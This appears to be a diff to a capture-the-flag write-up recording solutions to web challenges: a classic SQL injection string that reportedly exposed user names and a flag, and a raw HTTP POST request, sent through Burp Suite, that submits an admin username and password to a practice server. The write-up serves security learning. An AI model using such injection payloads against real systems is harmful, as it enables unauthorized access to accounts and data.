@@ -4,3 +4,15 @@ Basic Injection
 This payload showed me the user names and the flag >
 ' or '1'='1
 
+============
+POST Practice
+============
+Solved by sending post request using burpsuite > 
+POST /post.php HTTP/1.1
+Host: 165.227.106.113
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 42
+Connection: close
+
+username=admin&password=71urlkufpsdnlkadsf
